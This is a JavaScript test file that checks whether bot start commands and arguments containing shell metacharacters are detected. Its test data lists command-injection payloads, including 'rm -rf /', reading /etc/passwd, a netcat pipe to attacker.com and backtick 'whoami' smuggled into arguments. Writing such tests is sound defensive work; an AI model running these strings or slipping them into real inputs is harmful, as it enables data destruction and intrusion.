/**
 * Security Test V26: Command Injection Prevention
 * 
 * Verifiziert, dass Bot-Startkommandos nicht für Shell-Injection missbraucht werden können.
 */

import { describe, it } from 'node:test';
import assert from 'node:assert';

describe('Security V26: Command Injection Prevention', () => {
  const maliciousPatterns = [
    'foo; touch /tmp/pwned',
    'foo && touch /tmp/pwned',
    'foo | touch /tmp/pwned',
    'foo || touch /tmp/pwned',
    'foo`touch /tmp/pwned`',
    'foo$(touch /tmp/pwned)',
    'foo\n touch /tmp/pwned',
    'foo\r touch /tmp/pwned',
    'foo\\ntouch /tmp/pwned',
    'foo\\r\\ntouch /tmp/pwned',
    '${touch,/tmp/pwned}',
    '; rm -rf /',
    '&& cat /etc/passwd',
    '| nc attacker.com 4444',
    '> /tmp/backdoor',
    '< /etc/passwd',
  ];

  it('should reject shell metacharacters in command strings', () => {
    for (const pattern of maliciousPatterns) {
      // Test that the pattern would be caught by validation
      const hasShellMeta = /[;&|`$(){}\n\r<>\\]/.test(pattern);
      assert.strictEqual(
        hasShellMeta,
        true,
        `Pattern "${pattern}" should be detected as containing shell metacharacters`
      );
    }
  });

  it('should allow safe command patterns', () => {
    const safePatterns = [
      'node',
      'node server.js',
      'python3',
      'python3 main.py',
      './gradlew',
      './mvnw',
      'npm',
      'npm start',
      'java',
      'java -jar app.jar',
    ];

    for (const pattern of safePatterns) {
      const hasShellMeta = /[;&|`$(){}\n\r<>]/.test(pattern);
      assert.strictEqual(
        hasShellMeta,
        false,
        `Pattern "${pattern}" should be considered safe`
      );
    }
  });

  it('should validate executable paths', () => {
    const unsafeExecutables = [
      '/bin/sh',
      '/bin/bash',
      '/usr/bin/python',
      '../../bin/node',
      '../etc/passwd',
    ];

    for (const exec of unsafeExecutables) {
      const isAbsolute = exec.startsWith('/');
      const hasTraversal = exec.includes('..');
      
      assert(
        isAbsolute || hasTraversal,
        `Executable "${exec}" should be flagged as unsafe`
      );
    }
  });

  it('should allow relative safe executables', () => {
    const safeExecutables = [
      'node',
      'python3',
      './node_modules/.bin/webpack',
      './gradlew',
      './mvnw',
    ];

    for (const exec of safeExecutables) {
      const isAbsolute = exec.startsWith('/');
      const hasTraversal = exec.includes('..');
      
      assert(
        !isAbsolute && !hasTraversal,
        `Executable "${exec}" should be considered safe`
      );
    }
  });

  it('should validate argument list separately from executable', () => {
    // This test verifies that arguments are treated as separate entities
    // and not concatenated into a shell command string
    
    const executable = 'node';
    const args = ['server.js', '--port', '8080'];
    
    // Arguments should not be interpreted as shell commands
    for (const arg of args) {
      const hasShellMeta = /[;&|`$(){}\n\r<>]/.test(arg);
      assert.strictEqual(
        hasShellMeta,
        false,
        `Argument "${arg}" should not contain shell metacharacters`
      );
    }
  });

  it('should reject arguments with shell metacharacters', () => {
    const executable = 'node';
    const maliciousArgs = [
      'server.js; touch /tmp/pwned',
      '--port=8080 && rm -rf /',
      'config.json`whoami`',
    ];

    for (const arg of maliciousArgs) {
      const hasShellMeta = /[;&|`$(){}\n\r<>]/.test(arg);
      assert.strictEqual(
        hasShellMeta,
        true,
        `Argument "${arg}" should be detected as malicious`
      );
    }
  });
});
